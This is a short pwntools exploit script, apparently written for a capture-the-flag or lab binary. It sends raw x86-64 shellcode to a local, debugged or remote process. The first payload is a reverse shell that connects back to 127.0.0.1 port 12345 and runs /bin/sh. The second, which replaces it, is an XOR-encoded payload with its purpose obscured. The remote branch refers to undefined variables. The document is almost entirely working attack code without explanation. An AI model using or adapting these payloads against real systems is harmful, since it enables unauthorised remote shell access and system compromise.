#!/usr/bin/env python3

from pwn import *

#context.terminal = ["tmux", "splitw", "-h"]

gs = '''
continue
'''

asm = ("\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x30\x39\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05")

asm = ("\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\xa6\x87\x54\x73\x12\x75\x90\x97\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xcc\xae\x0c\xea\x78\x77"
"\xcf\xfd\xa7\xd9\x5b\x76\x5a\xe2\xd8\x2e\xa4\x87\x64\x4a\x6d"
"\x75\x90\x96\xf7\xcf\xdd\x95\x78\x65\xca\xfd\x8c\xdf\x5b\x76"
"\x78\x76\xce\xdf\x59\x49\x3e\x52\x4a\x7a\x95\xe2\x50\xed\x6f"
"\x2b\x8b\x3d\x2b\xb8\xc4\xee\x3a\x5c\x61\x1d\x90\xc4\xee\x0e"
"\xb3\x21\x45\x3d\x19\x71\xa9\x82\x54\x73\x12\x75\x90\x97")

def start():
    if args.REMOTE:
        return remote(ip, port)
    binary = args.BIN
    e = context.binary = ELF(binary)
    r = ROP(e)
    if args.DEBUG:
        return gdb.debug(e.path, gdbscript=gs)
    return process(e.path)

p = start()

def send_shellcode():
    p.sendline(bytes(asm, "latin-1"))

send_shellcode()

p.interactive()
